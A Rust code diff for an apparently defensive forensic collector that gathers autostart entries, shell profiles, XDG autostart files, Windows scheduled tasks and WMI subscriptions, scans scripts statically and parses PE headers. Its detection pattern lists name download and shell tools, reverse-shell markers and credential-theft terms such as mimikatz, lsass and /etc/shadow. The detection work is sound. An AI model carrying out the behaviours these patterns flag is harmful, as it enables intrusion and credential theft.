@@ -454,21 +454,24 @@ pub fn collect_autostart_entries(
 
     for path in candidate_paths {
         if path.is_dir() {
-            for entry in std::fs::read_dir(&path).unwrap_or_else(|_| std::fs::read_dir("/").unwrap()) {
-                let Some(entry) = entry.ok() else { continue };
+            let Ok(entries) = std::fs::read_dir(&path) else { continue };
+            for entry in entries.flatten() {
                 let p = entry.path();
                 if p.is_file() {
-                    let content = std::fs::read_to_string(&p).unwrap_or_default();
-                    let suspicious = content.lines().any(|line| {
-                        let lower = line.to_lowercase();
-                        suspicious_patterns.iter().any(|pattern| lower.contains(pattern))
-                    });
+                    let Ok(content) = std::fs::read_to_string(&p) else { continue };
+                    let lower = content.to_lowercase();
+                    let matches: Vec<&str> = suspicious_patterns.iter().copied()
+                        .filter(|pattern| lower.contains(pattern))
+                        .collect();
                     results.push(serde_json::json!({
                         "collector": "autostart",
                         "artifact_type": "autostart_entry",
                         "path": p.display().to_string(),
-                        "suspicious": suspicious,
-                        "content_sample": content.lines().take(20).collect::<Vec<_>>(),
+                        "sha256": sha256_file(&p),
+                        "modified_at": modified_at(&p),
+                        "line_count": content.lines().count(),
+                        "indicators": matches,
+                        "suspicious": !matches.is_empty(),
                     }));
                 }
             }
@@ -479,17 +482,20 @@ pub fn collect_autostart_entries(
             continue;
         }
 
-        let content = std::fs::read_to_string(&path).unwrap_or_default();
-        let suspicious = content.lines().any(|line| {
-            let lower = line.to_lowercase();
-            suspicious_patterns.iter().any(|pattern| lower.contains(pattern))
-        });
+        let Ok(content) = std::fs::read_to_string(&path) else { continue };
+        let lower = content.to_lowercase();
+        let matches: Vec<&str> = suspicious_patterns.iter().copied()
+            .filter(|pattern| lower.contains(pattern))
+            .collect();
         results.push(serde_json::json!({
             "collector": "autostart",
             "artifact_type": "autostart_entry",
             "path": path.display().to_string(),
-            "suspicious": suspicious,
-            "content_sample": content.lines().take(20).collect::<Vec<_>>(),
+            "sha256": sha256_file(&path),
+            "modified_at": modified_at(&path),
+            "line_count": content.lines().count(),
+            "indicators": matches,
+            "suspicious": !matches.is_empty(),
         }));
     }
 
@@ -501,6 +507,228 @@ pub fn collect_autostart_entries(
     }
 
     Ok(results)
+}
+
+/// Collect shell startup profile metadata without copying profile contents into evidence.
+pub fn collect_shell_profiles(
+    search_path: Option<&str>,
+) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    let mut candidates = Vec::new();
+    if let Some(path) = search_path {
+        let path = Path::new(path);
+        if path.is_file() {
+            candidates.push(path.to_path_buf());
+        } else if path.is_dir() {
+            candidates.extend(walkdir_max_depth(path, 2).into_iter().filter(|p| {
+                matches!(p.file_name().and_then(|name| name.to_str()),
+                    Some(".profile" | ".bash_profile" | ".bashrc" | ".zprofile" | ".zshrc" | "profile" | "bash.bashrc" | "zshrc"))
+            }));
+        }
+    } else {
+        for path in ["/etc/profile", "/etc/bash.bashrc", "/etc/zsh/zshrc"] {
+            let path = Path::new(path);
+            if path.is_file() {
+                candidates.push(path.to_path_buf());
+            }
+        }
+        for root in [Path::new("/etc/profile.d"), Path::new("/root")] {
+            if root.is_dir() {
+                candidates.extend(walkdir_max_depth(root, 2).into_iter().filter(|p| {
+                    matches!(p.file_name().and_then(|name| name.to_str()),
+                        Some(".profile" | ".bash_profile" | ".bashrc" | ".zprofile" | ".zshrc"))
+                }));
+            }
+        }
+        if let Ok(home) = std::env::var("HOME") {
+            let home = Path::new(&home);
+            for name in [".profile", ".bash_profile", ".bashrc", ".zprofile", ".zshrc"] {
+                let candidate = home.join(name);
+                if candidate.is_file() {
+                    candidates.push(candidate);
+                }
+            }
+        }
+        let homes = Path::new("/home");
+        if let Ok(entries) = std::fs::read_dir(homes) {
+            for home in entries.flatten().map(|entry| entry.path()).filter(|path| path.is_dir()) {
+                for name in [".profile", ".bash_profile", ".bashrc", ".zprofile", ".zshrc"] {
+                    let candidate = home.join(name);
+                    if candidate.is_file() {
+                        candidates.push(candidate);
+                    }
+                }
+            }
+        }
+    }
+    candidates.sort();
+    candidates.dedup();
+
+    let mut records = Vec::new();
+    for path in candidates {
+        let Ok(content) = std::fs::read_to_string(&path) else { continue };
+        let active_lines: Vec<&str> = content.lines()
+            .map(str::trim)
+            .filter(|line| !line.is_empty() && !line.starts_with('#'))
+            .collect();
+        let lower = content.to_ascii_lowercase();
+        let indicators = [
+            ("dynamic_evaluation", "eval"),
+            ("remote_download", "curl "),
+            ("remote_download", "wget "),
+            ("shell_execution", "bash -c"),
+            ("network_utility", "nc "),
+            ("path_modification", "path="),
+        ].iter().filter_map(|(indicator, pattern)| lower.contains(pattern).then_some(*indicator))
+            .collect::<std::collections::HashSet<_>>().into_iter().collect::<Vec<_>>();
+        records.push(serde_json::json!({
+            "artifact_type": "shell_profile",
+            "path": path.display().to_string(),
+            "sha256": sha256_file(&path),
+            "modified_at": modified_at(&path),
+            "active_directive_count": active_lines.len(),
+            "indicators": indicators,
+        }));
+    }
+
+    if records.is_empty() {
+        records.push(serde_json::json!({
+            "collector": "shell_profiles",
+            "status": "no_artifacts_found",
+        }));
+    }
+    Ok(records)
+}
+
+/// Parse XDG autostart desktop entries without executing their commands.
+pub fn collect_xdg_autostart_entries(
+    search_path: Option<&str>,
+) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    let mut directories = Vec::new();
+    if let Some(path) = search_path {
+        let path = Path::new(path);
+        if path.is_dir() {
+            directories.push(path.to_path_buf());
+        } else if path.is_file() {
+            directories.push(path.parent().unwrap_or(Path::new(".")).to_path_buf());
+        }
+    } else {
+        directories.extend([Path::new("/etc/xdg/autostart").to_path_buf()]);
+        if let Ok(home) = std::env::var("HOME") {
+            directories.push(Path::new(&home).join(".config/autostart"));
+        }
+        if let Ok(homes) = std::fs::read_dir("/home") {
+            directories.extend(homes.flatten().map(|entry| entry.path().join(".config/autostart")));
+        }
+    }
+
+    let mut records = Vec::new();
+    for directory in directories.into_iter().filter(|path| path.is_dir()) {
+        let Ok(entries) = std::fs::read_dir(&directory) else { continue };
+        for path in entries.flatten().map(|entry| entry.path()).filter(|path| {
+            path.extension().and_then(|ext| ext.to_str()) == Some("desktop")
+        }) {
+            let Ok(content) = std::fs::read_to_string(&path) else { continue };
+            let mut in_desktop_entry = false;
+            let mut fields = serde_json::Map::new();
+            for line in content.lines().map(str::trim) {
+                if line.starts_with('[') && line.ends_with(']') {
+                    in_desktop_entry = line == "[Desktop Entry]";
+                } else if in_desktop_entry && !line.is_empty() && !line.starts_with('#') {
+                    if let Some((key, value)) = line.split_once('=') {
+                        if matches!(key, "Name" | "Exec" | "TryExec" | "Hidden" | "X-GNOME-Autostart-enabled" | "Type") {
+                            fields.insert(key.to_string(), serde_json::Value::String(value.to_string()));
+                        }
+                    }
+                }
+            }
+            records.push(serde_json::json!({
+                "artifact_type": "xdg_autostart",
+                "path": path.display().to_string(),
+                "sha256": sha256_file(&path),
+                "modified_at": modified_at(&path),
+                "desktop_entry": fields,
+            }));
+        }
+    }
+
+    if records.is_empty() {
+        records.push(serde_json::json!({
+            "collector": "xdg_autostart",
+            "status": "no_artifacts_found",
+        }));
+    }
+    Ok(records)
+}
+
+/// Enumerate Windows scheduled-task metadata using read-only Task Scheduler queries.
+pub fn collect_windows_scheduled_tasks() -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    #[cfg(target_os = "windows")]
+    {
+        let output = std::process::Command::new("powershell")
+            .args([
+                "-NoLogo", "-NoProfile", "-NonInteractive", "-Command",
+                "Get-ScheduledTask | Select-Object TaskName,TaskPath,State,Description,Principal,Actions,Triggers | ConvertTo-Json -Depth 7 -Compress",
+            ])
+            .output()?;
+        if !output.status.success() {
+            return Err(format!("Task Scheduler query failed with {}", output.status).into());
+        }
+        return parse_powershell_records(&output.stdout, "scheduled_tasks");
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        Ok(vec![serde_json::json!({
+            "collector": "scheduled_tasks",
+            "status": "unsupported",
+            "platform": std::env::consts::OS,
+        })])
+    }
+}
+
+/// Enumerate Windows WMI event filters, consumers, and bindings without running them.
+pub fn collect_windows_wmi_subscriptions() -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    #[cfg(target_os = "windows")]
+    {
+        let script = "$names=@('__EventFilter','CommandLineEventConsumer','ActiveScriptEventConsumer','__FilterToConsumerBinding'); $out=@(); foreach($n in $names){ $out += Get-CimInstance -Namespace root/subscription -ClassName $n -ErrorAction SilentlyContinue | Select-Object @{Name='Class';Expression={$n}}, * }; ConvertTo-Json -InputObject $out -Depth 7 -Compress";
+        let output = std::process::Command::new("powershell")
+            .args(["-NoLogo", "-NoProfile", "-NonInteractive", "-Command", script])
+            .output()?;
+        if !output.status.success() {
+            return Err(format!("WMI subscription query failed with {}", output.status).into());
+        }
+        return parse_powershell_records(&output.stdout, "wmi_subscriptions");
+    }
+    #[cfg(not(target_os = "windows"))]
+    {
+        Ok(vec![serde_json::json!({
+            "collector": "wmi_subscriptions",
+            "status": "unsupported",
+            "platform": std::env::consts::OS,
+        })])
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn parse_powershell_records(
+    stdout: &[u8],
+    collector: &str,
+) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    let value: serde_json::Value = serde_json::from_slice(stdout)?;
+    let records = match value {
+        serde_json::Value::Array(records) => records,
+        serde_json::Value::Null => Vec::new(),
+        record => vec![record],
+    };
+    if records.is_empty() {
+        return Ok(vec![serde_json::json!({
+            "collector": collector,
+            "status": "no_artifacts_found",
+        })]);
+    }
+    Ok(records.into_iter().map(|record| serde_json::json!({
+        "collector": collector,
+        "record": record,
+    })).collect())
 }
 
 /// Collect cron job entries from system and user crontabs
@@ -1080,268 +1308,201 @@ pub fn carve_ssh_config(
 pub fn analyze_powershell_scripts(
     search_path: &str,
 ) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
-    let path = Path::new(search_path);
-    if !path.exists() {
-        return Ok(vec![serde_json::json!({
-            "collector": "artifacts",
-            "artifact_type": "powershell_script",
-            "status": "path_not_found",
-            "search_path": search_path,
-        })]);
-    }
-    #[cfg(target_os = "windows")]
-    {
-        // Find .ps1 files
-        let mut results = Vec::new();
-        for entry in walkdir_max_depth(path, 3) {
-            if entry.extension().and_then(|e| e.to_str()) == Some("ps1") {
-                let content = std::fs::read_to_string(&entry).unwrap_or_default();
-                let sha256 = sha256_file(&entry);
-                let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
-                
-                // Simple analysis
-                let suspicious = content.to_lowercase().contains("invoke-expression")
-                    || content.to_lowercase().contains("iex")
-                    || content.to_lowercase().contains("downloadstring")
-                    || content.to_lowercase().contains("bypass")
-                    || content.to_lowercase().contains("encodedcommand")
-                    || content.to_lowercase().contains("amsi");
-                
-                results.push(serde_json::to_value(CarvedArtifact {
-                    artifact_type: "powershell_script".to_string(),
-                    path: entry.display().to_string(),
-                    size_bytes: size,
-                    sha256,
-                    modified_at: modified_at(&entry),
-                    metadata: serde_json::json!({
-                        "suspicious_patterns": if suspicious { vec!["potential_obfuscation", "amsi_bypass", "download_execute"] } else { vec![] },
-                    }),
-                    suspicious,
-                    suspicious_reason: if suspicious {
-                        Some("PowerShell script contains suspicious patterns".to_string())
-                    } else {
-                        None
-                    },
-                })?);
-            }
-        }
-        
-        if results.is_empty() {
-            results.push(serde_json::json!({
-                "collector": "artifacts",
-                "artifact_type": "powershell_script",
-                "status": "no_artifacts_found",
-            }));
-        }
-        
-        return Ok(results);
-    }
-    Ok(vec![serde_json::json!({
-        "collector": "artifacts",
-        "artifact_type": "powershell_script",
-        "status": "platform_note",
-        "note": "PowerShell script analysis is Windows-specific",
-    })])
+    analyze_static_script_files(search_path, "powershell_script", &["ps1"])
 }
 
 /// WMI/VBScript analyzer
 pub fn analyze_wmi_scripts(
     search_path: &str,
 ) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
-    let path = Path::new(search_path);
-    if !path.exists() {
-        return Ok(vec![serde_json::json!({
-            "collector": "artifacts",
-            "artifact_type": "wmi_script",
-            "status": "path_not_found",
-            "search_path": search_path,
-        })]);
-    }
-    #[cfg(target_os = "windows")]
-    {
-        // Find .vbs files
-        let mut results = Vec::new();
-        for entry in walkdir_max_depth(path, 3) {
-            if entry.extension().and_then(|e| e.to_str()) == Some("vbs") {
-                let content = std::fs::read_to_string(&entry).unwrap_or_default();
-                let sha256 = sha256_file(&entry);
-                let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
-                
-                let suspicious = content.to_lowercase().contains("wscript.shell")
-                    || content.to_lowercase().contains("wmi")
-                    || content.to_lowercase().contains("execquery")
-                    || content.to_lowercase().contains("createobject");
-                
-                results.push(serde_json::to_value(CarvedArtifact {
-                    artifact_type: "wmi_script".to_string(),
-                    path: entry.display().to_string(),
-                    size_bytes: size,
-                    sha256,
-                    modified_at: modified_at(&entry),
-                    metadata: serde_json::json!({
-                        "suspicious_patterns": if suspicious { vec!["wmi_query", "shell_execution"] } else { vec![] },
-                    }),
-                    suspicious,
-                    suspicious_reason: if suspicious {
-                        Some("VBScript contains suspicious WMI/shell patterns".to_string())
-                    } else {
-                        None
-                    },
-                })?);
-            }
-        }
-        
-        if results.is_empty() {
-            results.push(serde_json::json!({
-                "collector": "artifacts",
-                "artifact_type": "wmi_script",
-                "status": "no_artifacts_found",
-            }));
-        }
-        
-        return Ok(results);
-    }
-    Ok(vec![serde_json::json!({
-        "collector": "artifacts",
-        "artifact_type": "wmi_script",
-        "status": "platform_note",
-        "note": "WMI/VBScript analysis is Windows-specific",
-    })])
+    analyze_static_script_files(search_path, "wmi_script", &["vbs", "vbe"])
 }
 
 /// Shell script analyzer
 pub fn analyze_shell_scripts(
     search_path: &str,
 ) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
-    let path = Path::new(search_path);
-    if !path.exists() {
-        return Ok(vec![serde_json::json!({
-            "collector": "artifacts",
-            "artifact_type": "shell_script",
-            "status": "path_not_found",
-            "search_path": search_path,
-        })]);
-    }
-    #[cfg(target_os = "linux")]
-    {
-        // Find .sh files
-        let mut results = Vec::new();
-        for entry in walkdir_max_depth(path, 3) {
-            if entry.extension().and_then(|e| e.to_str()) == Some("sh") {
-                let content = std::fs::read_to_string(&entry).unwrap_or_default();
-                let sha256 = sha256_file(&entry);
-                let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
-                
-                let suspicious = content.to_lowercase().contains("base64")
-                    || content.to_lowercase().contains("wget")
-                    || content.to_lowercase().contains("curl")
-                    || content.to_lowercase().contains("nc ")
-                    || content.to_lowercase().contains("/dev/tcp")
-                    || content.to_lowercase().contains("chmod +x")
-                    || content.to_lowercase().contains("python -c")
-                    || content.to_lowercase().contains("perl -e")
-                    || content.to_lowercase().contains("bash -i");
-                
-                results.push(serde_json::to_value(CarvedArtifact {
-                    artifact_type: "shell_script".to_string(),
-                    path: entry.display().to_string(),
-                    size_bytes: size,
-                    sha256,
-                    modified_at: modified_at(&entry),
-                    metadata: serde_json::json!({
-                        "suspicious_patterns": if suspicious { vec!["obfuscation", "download_execute", "reverse_shell"] } else { vec![] },
-                    }),
-                    suspicious,
-                    suspicious_reason: if suspicious {
-                        Some("Shell script contains suspicious patterns".to_string())
-                    } else {
-                        None
-                    },
-                })?);
-            }
-        }
-        
-        if results.is_empty() {
-            results.push(serde_json::json!({
-                "collector": "artifacts",
-                "artifact_type": "shell_script",
-                "status": "no_artifacts_found",
-            }));
-        }
-        
-        return Ok(results);
-    }
-    #[cfg(not(target_os = "linux"))]
-    {
-        Ok(vec![serde_json::json!({
-            "collector": "artifacts",
-            "artifact_type": "shell_script",
-            "status": "platform_note",
-            "note": "Shell script analysis is Linux-specific",
-        })])
-    }
+    analyze_static_script_files(search_path, "shell_script", &["sh", "bash", "zsh", "ksh"])
 }
 
 /// Python script analyzer
 pub fn analyze_python_scripts(
     search_path: &str,
 ) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
-    let path = Path::new(search_path);
-    if !path.exists() {
+    analyze_static_script_files(search_path, "python_script", &["py"])
+}
+
+pub fn analyze_javascript_scripts(
+    search_path: &str,
+) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    analyze_static_script_files(search_path, "javascript_script", &["js", "mjs", "cjs"])
+}
+
+pub fn analyze_batch_scripts(
+    search_path: &str,
+) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    analyze_static_script_files(search_path, "batch_script", &["bat", "cmd"])
+}
+
+pub fn analyze_all_script_files(
+    search_path: &str,
+) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    analyze_static_script_files(
+        search_path,
+        "script",
+        &["ps1", "vbs", "vbe", "sh", "bash", "zsh", "ksh", "py", "js", "mjs", "cjs", "bat", "cmd"],
+    )
+}
+
+fn analyze_static_script_files(
+    search_path: &str,
+    artifact_type: &str,
+    extensions: &[&str],
+) -> Result<Vec<serde_json::Value>, Box<dyn std::error::Error>> {
+    let root = Path::new(search_path);
+    if !root.exists() {
         return Ok(vec![serde_json::json!({
-            "collector": "artifacts",
-            "artifact_type": "python_script",
+            "collector": "script_analysis",
+            "artifact_type": artifact_type,
             "status": "path_not_found",
             "search_path": search_path,
         })]);
     }
-    {
-        // Find .py files
-        let mut results = Vec::new();
-        for entry in walkdir_max_depth(path, 3) {
-            if entry.extension().and_then(|e| e.to_str()) == Some("py") {
-                let content = std::fs::read_to_string(&entry).unwrap_or_default();
-                let sha256 = sha256_file(&entry);
-                let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
-                
-                let suspicious = content.to_lowercase().contains("base64")
-                    || content.to_lowercase().contains("exec(")
-                    || content.to_lowercase().contains("eval(")
-                    || content.to_lowercase().contains("subprocess")
-                    || content.to_lowercase().contains("os.system")
-                    || content.to_lowercase().contains("socket")
-                    || content.to_lowercase().contains("requests")
-                    || content.to_lowercase().contains("urllib");
-                
-                results.push(serde_json::to_value(CarvedArtifact {
-                    artifact_type: "python_script".to_string(),
-                    path: entry.display().to_string(),
-                    size_bytes: size,
-                    sha256,
-                    modified_at: modified_at(&entry),
-                    metadata: serde_json::json!({
-                        "suspicious_patterns": if suspicious { vec!["code_execution", "network_access", "obfuscation"] } else { vec![] },
-                    }),
-                    suspicious,
-                    suspicious_reason: if suspicious {
-                        Some("Python script contains suspicious patterns".to_string())
-                    } else {
-                        None
-                    },
-                })?);
+    let files = if root.is_file() { vec![root.to_path_buf()] } else { walkdir_max_depth(root, 3) };
+    let mut records = Vec::new();
+    for path in files.into_iter().filter(|path| {
+        path.extension().and_then(|ext| ext.to_str()).is_some_and(|ext| extensions.contains(&ext.to_ascii_lowercase().as_str()))
+    }) {
+        let bytes = match std::fs::read(&path) {
+            Ok(bytes) => bytes,
+            Err(error) => {
+                records.push(serde_json::json!({
+                    "collector": "script_analysis",
+                    "artifact_type": artifact_type,
+                    "path": path.display().to_string(),
+                    "status": "partial",
+                    "read_error": error.to_string(),
+                }));
+                continue;
+            }
+        };
+        let content = String::from_utf8_lossy(&bytes);
+        let analysis = static_script_indicators(&content);
+        let suspicious = analysis["suspicious"].as_bool().unwrap_or(false);
+        let reasons = analysis["behavior_indicators"].as_array().cloned().unwrap_or_default();
+        records.push(serde_json::json!({
+            "artifact_type": artifact_type,
+            "path": path.display().to_string(),
+            "size_bytes": bytes.len(),
+            "sha256": sha256_file(&path),
+            "modified_at": modified_at(&path),
+            "static_analysis": analysis,
+            "suspicious": suspicious,
+            "suspicious_reason": if suspicious { Some(format!("Static indicators: {}", reasons.iter().filter_map(serde_json::Value::as_str).collect::<Vec<_>>().join(", "))) } else { None::<String> },
+        }));
+    }
+    if records.is_empty() {
+        records.push(serde_json::json!({
+            "collector": "script_analysis",
+            "artifact_type": artifact_type,
+            "status": "no_artifacts_found",
+        }));
+    }
+    Ok(records)
+}
+
+fn static_script_indicators(content: &str) -> serde_json::Value {
+    use std::collections::BTreeSet;
+    let mut urls = BTreeSet::new();
+    let mut domains = BTreeSet::new();
+    let mut ips = BTreeSet::new();
+    let mut paths = BTreeSet::new();
+    let mut environment_variables = BTreeSet::new();
+    let mut commands = BTreeSet::new();
+    let mut encoded_strings = Vec::new();
+
+    for line in content.lines() {
+        let line_lower = line.to_ascii_lowercase();
+        for token in line.split(|ch: char| ch.is_whitespace() || matches!(ch, '"' | '\'' | ',' | ';' | '(' | ')' | '[' | ']' | '{' | '}')) {
+            let token = token.trim_matches(|ch: char| matches!(ch, '.' | ':' | '!' | '?' | '<' | '>'));
+            if token.is_empty() { continue; }
+            if token.starts_with("http://") || token.starts_with("https://") || token.starts_with("ftp://") {
+                let safe_url = token.split(['?', '#']).next().unwrap_or(token);
+                urls.insert(safe_url.to_string());
+                if let Some((_, authority)) = safe_url.split_once("://") {
+                    let host = authority.split(|ch| matches!(ch, '/' | ':' )).next().unwrap_or("");
+                    if host.contains('.') && host.parse::<std::net::IpAddr>().is_err() {
+                        domains.insert(host.to_ascii_lowercase());
+                    }
+                    if let Ok(ip) = host.parse::<std::net::IpAddr>() { ips.insert(ip.to_string()); }
+                }
+            }
+            let ip_candidate = token.trim_matches(|ch: char| matches!(ch, ':' | '/' | '\\'));
+            if let Ok(ip) = ip_candidate.parse::<std::net::IpAddr>() { ips.insert(ip.to_string()); }
+            if token.starts_with('/') || token.starts_with("./") || token.starts_with("~/")
+                || (token.as_bytes().get(1) == Some(&b':') && token.as_bytes()[0].is_ascii_alphabetic())
+                || token.to_ascii_uppercase().starts_with("HKLM\\") || token.to_ascii_uppercase().starts_with("HKCU\\") {
+                paths.insert(token.to_string());
+            }
+            if token.len() >= 24 && token.bytes().all(|byte| byte.is_ascii_alphanumeric() || b"+/=_-".contains(&byte))
+                && ["base64", "encodedcommand", "frombase64string", "-enc"].iter().any(|marker| line_lower.contains(marker)) {
+                use sha2::Digest;
+                let mut hasher = Sha256::new();
+                hasher.update(token.as_bytes());
+                encoded_strings.push(serde_json::json!({
+                    "length": token.len(),
+                    "sha256": format!("{:x}", hasher.finalize()),
+                }));
             }
         }
-        
-        if results.is_empty() {
-            results.push(serde_json::json!({
-                "collector": "artifacts",
-                "artifact_type": "python_script",
-                "status": "no_artifacts_found",
-            }));
+        for (prefix, delimiter) in [("$env:", ' '), ("$", ' '), ("%", '%')] {
+            let mut rest = line;
+            while let Some(start) = rest.to_ascii_lowercase().find(prefix) {
+                let after = &rest[start + prefix.len()..];
+                let name = if prefix == "%" {
+                    after.split(delimiter).next().unwrap_or("")
+                } else {
+                    after.trim_start_matches('{').split(|ch: char| !(ch.is_ascii_alphanumeric() || ch == '_')).next().unwrap_or("")
+                };
+                if !name.is_empty() { environment_variables.insert(name.to_string()); }
+                let advance = start + prefix.len() + name.len().max(1);
+                if advance >= rest.len() { break; }
+                rest = &rest[advance..];
+            }
         }
-        
-        return Ok(results);
     }
+
+    let command_patterns = ["curl", "wget", "invoke-webrequest", "downloadstring", "invoke-expression", "iex", "exec", "eval", "subprocess", "os.system", "start-process", "schtasks", "crontab", "systemctl", "wscript.shell", "createobject", "socket", "requests", "urllib"];
+    let behavior_patterns: &[(&str, &[&str])] = &[
+        ("download", &["curl ", "wget ", "invoke-webrequest", "downloadstring", "urlretrieve"]),
+        ("execution", &["invoke-expression", "iex ", "exec(", "eval(", "subprocess", "os.system", "start-process"]),
+        ("persistence", &["schtasks", "crontab", "systemctl enable", "runonce", "startup", ".bashrc", ".profile"]),
+        ("credential_access", &["lsass", "mimikatz", "/etc/shadow", "sam\\", "password"]),
+        ("network_operation", &["socket", "requests", "urllib", "/dev/tcp", "netcat", "nc -"]),
+        ("file_operation", &["open(", "file.copy", "copy-item", "remove-item", "unlink("]),
+        ("process_operation", &["subprocess", "processstartinfo", "start-process", "createprocess"]),
+        ("obfuscation", &["base64", "encodedcommand", "frombase64string", "charcodeat"]),
+    ];
+    let lower = content.to_ascii_lowercase();
+    for command in command_patterns {
+        if lower.contains(command) { commands.insert(command.to_string()); }
+    }
+    let behaviors: Vec<&str> = behavior_patterns.iter().filter_map(|(name, markers)| {
+        markers.iter().any(|marker| lower.contains(marker)).then_some(*name)
+    }).collect();
+    serde_json::json!({
+        "line_count": content.lines().count(),
+        "commands": commands,
+        "urls": urls,
+        "domains": domains,
+        "ip_addresses": ips,
+        "file_or_registry_paths": paths,
+        "environment_variables": environment_variables,
+        "encoded_strings": encoded_strings,
+        "behavior_indicators": behaviors,
+        "suspicious": !behaviors.is_empty(),
+        "execution_mode": "static_only",
+    })
 }
 
 /// PE metadata parser
@@ -1357,48 +1518,187 @@ pub fn parse_pe_metadata(
             "search_path": search_path,
         })]);
     }
-    #[cfg(target_os = "windows")]
-    {
-        // Find .exe, .dll files
-        let mut results = Vec::new();
-        for entry in walkdir_max_depth(path, 3) {
-            let ext = entry.extension().and_then(|e| e.to_str()).unwrap_or("");
-            if ext == "exe" || ext == "dll" || ext == "sys" {
-                let sha256 = sha256_file(&entry);
-                let size = entry.metadata().map(|m| m.len()).unwrap_or(0);
-                
-                results.push(serde_json::to_value(CarvedArtifact {
-                    artifact_type: "pe_metadata".to_string(),
-                    path: entry.display().to_string(),
-                    size_bytes: size,
-                    sha256,
-                    modified_at: modified_at(&entry),
-                    metadata: serde_json::json!({
-                        "file_type": ext,
-                        "note": "PE parsing not fully implemented",
-                    }),
-                    suspicious: false,
-                    suspicious_reason: None,
-                })?);
-            }
-        }
-        
-        if results.is_empty() {
-            results.push(serde_json::json!({
+    let files = if path.is_file() { vec![path.to_path_buf()] } else { walkdir_max_depth(path, 3) };
+    let mut results = Vec::new();
+    for entry in files {
+        if !entry.is_file() { continue; }
+        let ext = entry.extension().and_then(|ext| ext.to_str()).unwrap_or("").to_ascii_lowercase();
+        let bytes = match std::fs::read(&entry) {
+            Ok(bytes) => bytes,
+            Err(_) => continue,
+        };
+        if !bytes.starts_with(b"MZ") && !matches!(ext.as_str(), "exe" | "dll" | "sys") { continue; }
+        let sha256 = sha256_file(&entry);
+        let size = bytes.len() as u64;
+        match parse_pe_bytes(&bytes) {
+            Ok(metadata) => results.push(serde_json::to_value(CarvedArtifact {
+                artifact_type: "pe_metadata".to_string(),
+                path: entry.display().to_string(),
+                size_bytes: size,
+                sha256,
+                modified_at: modified_at(&entry),
+                metadata,
+                suspicious: false,
+                suspicious_reason: None,
+            })?),
+            Err(error) => results.push(serde_json::json!({
                 "collector": "artifacts",
                 "artifact_type": "pe_metadata",
-                "status": "no_artifacts_found",
-            }));
+                "path": entry.display().to_string(),
+                "size_bytes": size,
+                "sha256": sha256,
+                "status": "partial",
+                "parse_error": error,
+            })),
         }
-        
-        return Ok(results);
     }
-    Ok(vec![serde_json::json!({
-        "collector": "artifacts",
-        "artifact_type": "pe_metadata",
-        "status": "platform_note",
-        "note": "PE metadata parsing is Windows-specific",
-    })])
+    if results.is_empty() {
+        results.push(serde_json::json!({
+            "collector": "artifacts",
+            "artifact_type": "pe_metadata",
+            "status": "no_artifacts_found",
+        }));
+    }
+    Ok(results)
+}
+
+fn pe_rva_to_offset(
+    rva: u32,
+    size_of_headers: u32,
+    sections: &[(u32, u32, u32, u32)],
+) -> Result<usize, String> {
+    if rva < size_of_headers { return Ok(rva as usize); }
+    for (virtual_address, virtual_size, raw_offset, raw_size) in sections {
+        let span = (*virtual_size).max(*raw_size);
+        if rva >= *virtual_address && rva - *virtual_address < span {
+            return Ok((*raw_offset + (rva - *virtual_address)) as usize);
+        }
+    }
+    Err(format!("PE RVA 0x{:x} does not map to a file offset", rva))
+}
+
+fn pe_string_at(bytes: &[u8], offset: usize) -> Result<String, String> {
+    let tail = bytes.get(offset..).ok_or_else(|| "PE string offset outside file".to_string())?;
+    let end = tail.iter().position(|byte| *byte == 0).ok_or_else(|| "unterminated PE string".to_string())?;
+    Ok(String::from_utf8_lossy(&tail[..end]).into_owned())
+}
+
+fn parse_pe_bytes(bytes: &[u8]) -> Result<serde_json::Value, String> {
+    if bytes.len() < 64 || !bytes.starts_with(b"MZ") {
+        return Err("invalid or truncated DOS header".to_string());
+    }
+    let pe_offset = read_elf_uint(bytes, 0x3c, 4, true)? as usize;
+    let signature_end = pe_offset.checked_add(4).ok_or_else(|| "PE signature offset overflow".to_string())?;
+    if bytes.get(pe_offset..signature_end) != Some(b"PE\0\0") {
+        return Err("invalid PE signature".to_string());
+    }
+    let coff = signature_end;
+    let machine = read_elf_uint(bytes, coff, 2, true)? as u16;
+    let section_count = read_elf_uint(bytes, coff + 2, 2, true)? as usize;
+    let timestamp = read_elf_uint(bytes, coff + 4, 4, true)? as u32;
+    let optional_size = read_elf_uint(bytes, coff + 16, 2, true)? as usize;
+    let characteristics = read_elf_uint(bytes, coff + 18, 2, true)? as u16;
+    if section_count > 4096 { return Err("PE section count exceeds parser limit".to_string()); }
+    let optional = coff.checked_add(20).ok_or_else(|| "PE optional-header offset overflow".to_string())?;
+    let optional_end = optional.checked_add(optional_size).ok_or_else(|| "PE optional-header size overflow".to_string())?;
+    if optional_end > bytes.len() { return Err("truncated PE optional header".to_string()); }
+    let magic = read_elf_uint(bytes, optional, 2, true)? as u16;
+    let (format, minimum_size, directory_start, number_directories_offset, image_base_offset, image_base_width) = match magic {
+        0x10b => ("PE32", 96, 96, 92, 28, 4),
+        0x20b => ("PE32+", 112, 112, 108, 24, 8),
+        _ => return Err(format!("unsupported PE optional-header magic 0x{:x}", magic)),
+    };
+    if optional_size < minimum_size { return Err("PE optional header is shorter than its format requires".to_string()); }
+    let entry_point = read_elf_uint(bytes, optional + 16, 4, true)? as u32;
+    let image_base = read_elf_uint(bytes, optional + image_base_offset, image_base_width, true)?;
+    let size_of_headers = read_elf_uint(bytes, optional + 60, 4, true)? as u32;
